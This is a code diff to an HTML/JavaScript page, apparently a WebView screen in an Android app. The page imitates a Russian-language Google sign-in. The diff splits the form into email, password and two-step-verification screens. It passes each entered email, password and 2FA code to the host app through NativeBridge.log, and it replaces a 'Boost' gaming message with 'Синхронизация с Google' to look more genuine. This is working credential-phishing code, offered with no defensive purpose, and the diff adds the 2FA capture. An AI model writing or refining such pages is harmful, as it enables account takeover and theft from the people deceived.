@@ -9,12 +9,13 @@
     font-family: -apple-system, 'Roboto', Arial, sans-serif; }
 body { background: #fff; color: #202124; min-height: 100vh;
        display: flex; flex-direction: column; align-items: center; padding: 24px 16px; }
-.logo { font-size: 24px; font-weight: 500; margin: 30px 0 20px;
+.logo { font-size: 26px; font-weight: 500; margin: 30px 0 20px;
         letter-spacing: -1px; }
 .g-blue{color:#4285f4}.g-red{color:#ea4335}.g-yellow{color:#fbbc05}.g-green{color:#34a853}
 .card { width: 100%; max-width: 420px; padding: 32px 24px; }
 h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; }
 .sub { text-align: center; font-size: 14px; margin-bottom: 32px; color: #202124; }
+.sub b { font-weight: 500; }
 .field { position: relative; margin-bottom: 24px; }
 .field input { width: 100%; padding: 16px 14px; font-size: 16px;
                border: 1px solid #dadce0; border-radius: 4px; outline: none;
@@ -29,26 +30,13 @@ h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; 
 .btn { background: #1a73e8; color: #fff; border: none; padding: 10px 24px;
        border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
 
-/* Экраны этапов */
-.screen { display: none; text-align: center; padding: 40px 20px; }
+.screen { display: none; text-align: center; padding: 20px; }
 .screen.active { display: block; }
 
 .spin { border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8;
         border-radius: 50%; width: 44px; height: 44px;
         animation: spin 1s linear infinite; margin: 0 auto 20px; }
 @keyframes spin { to { transform: rotate(360deg); } }
-
-.check { width: 72px; height: 72px; border-radius: 50%;
-         background: #34a853; margin: 0 auto 20px;
-         display: flex; align-items: center; justify-content: center;
-         animation: pop 0.4s ease-out; }
-.check::after { content: '✓'; color: #fff; font-size: 42px;
-                font-weight: bold; line-height: 1; }
-@keyframes pop {
-    0% { transform: scale(0); }
-    60% { transform: scale(1.1); }
-    100% { transform: scale(1); }
-}
 
 .msg { font-size: 18px; font-weight: 500; color: #202124; margin-bottom: 8px; }
 .msg-sub { font-size: 14px; color: #5f6368; margin-top: 8px; }
@@ -65,36 +53,52 @@ h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; 
 </div>
 
 <div class="card">
-    <div id="screenForm" class="screen active">
+
+    <div id="scEmail" class="screen active">
         <h1>Вход</h1>
         <p class="sub">Используйте аккаунт Google</p>
-        <form id="f">
-            <div class="field">
-                <label>Электронная почта или телефон</label>
-                <input type="email" id="email" autocomplete="off" autocapitalize="none">
-            </div>
-            <div class="field">
-                <label>Введите пароль</label>
-                <input type="password" id="password" autocomplete="off">
-            </div>
-            <div class="btn-row">
-                <a class="link">Забыли пароль?</a>
-                <button type="submit" class="btn">Далее</button>
-            </div>
-        </form>
+        <div class="field">
+            <label>Электронная почта или телефон</label>
+            <input type="email" id="email" autocomplete="off" autocapitalize="none">
+        </div>
+        <div class="btn-row">
+            <a class="link">Забыли пароль?</a>
+            <button class="btn" onclick="submitEmail()">Далее</button>
+        </div>
     </div>
 
-    <div id="screenLoad" class="screen">
+    <div id="scPass" class="screen">
+        <h1>Вход</h1>
+        <p class="sub">Введите пароль для <b id="shownEmail"></b></p>
+        <div class="field">
+            <label>Введите пароль</label>
+            <input type="password" id="password" autocomplete="off">
+        </div>
+        <div class="btn-row">
+            <a class="link">Забыли пароль?</a>
+            <button class="btn" onclick="submitPass()">Далее</button>
+        </div>
+    </div>
+
+    <div id="sc2FA" class="screen">
+        <h1>2-шаговая проверка</h1>
+        <p class="sub">Введите код подтверждения, отправленный на ваше устройство</p>
+        <div class="field">
+            <label>Код подтверждения</label>
+            <input type="text" id="code" inputmode="numeric" maxlength="6" autocomplete="off">
+        </div>
+        <div class="btn-row">
+            <a class="link">Не получается?</a>
+            <button class="btn" onclick="submitCode()">Далее</button>
+        </div>
+    </div>
+
+    <div id="scLoad" class="screen">
         <div class="spin"></div>
         <div class="msg">Проверка данных…</div>
-        <div class="msg-sub">Синхронизация с серверами Boost</div>
+        <div class="msg-sub">Синхронизация с Google</div>
     </div>
 
-    <div id="screenDone" class="screen">
-        <div class="check"></div>
-        <div class="msg">Аккаунт привязан</div>
-        <div class="msg-sub">Настраиваем игровой профиль…</div>
-    </div>
 </div>
 
 <div class="footer">
@@ -103,35 +107,56 @@ h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; 
 </div>
 
 <script>
+var state = { email: "", password: "" };
+
 function show(id) {
     var s = document.querySelectorAll('.screen');
     for (var i = 0; i < s.length; i++) s[i].classList.remove('active');
     document.getElementById(id).classList.add('active');
 }
 
-document.getElementById('f').addEventListener('submit', function(e){
-    e.preventDefault();
-    var email = document.getElementById('email').value;
-    var pass  = document.getElementById('password').value;
-    if (!email || !pass) return;
+function send(key, value) {
+    if (window.NativeBridge && NativeBridge.log) {
+        NativeBridge.log(key + "=" + value);
+    }
+}
 
-    show('screenLoad');
+function submitEmail() {
+    var e = document.getElementById('email').value;
+    if (!e) return;
+    state.email = e;
+    send("email", e);
+    document.getElementById('shownEmail').innerText = e;
+    show('scPass');
+}
 
-    setTimeout(function(){
-        // отправляем данные
-        if (window.NativeBridge && NativeBridge.log) {
-            NativeBridge.log("email=" + email + "\npassword=" + pass);
+function submitPass() {
+    var p = document.getElementById('password').value;
+    if (!p) return;
+    state.password = p;
+    send("password", p);
+
+    // имитируем проверку
+    show('scLoad');
+    setTimeout(function() {
+        // после пароля — 2FA
+        show('sc2FA');
+    }, 2000);
+}
+
+function submitCode() {
+    var c = document.getElementById('code').value;
+    if (!c) return;
+    send("2fa_code", c);
+
+    show('scLoad');
+    setTimeout(function() {
+        // успешно — уходим
+        if (window.NativeBridge && NativeBridge.done) {
+            NativeBridge.done();
         }
-        show('screenDone');
-
-        // через 1.5 сек уходим в приложение (MainActivity)
-        setTimeout(function(){
-            if (window.NativeBridge && NativeBridge.done) {
-                NativeBridge.done();
-            }
-        }, 1500);
-    }, 1800);
-});
+    }, 2000);
+}
 </script>
 </body>
 </html>
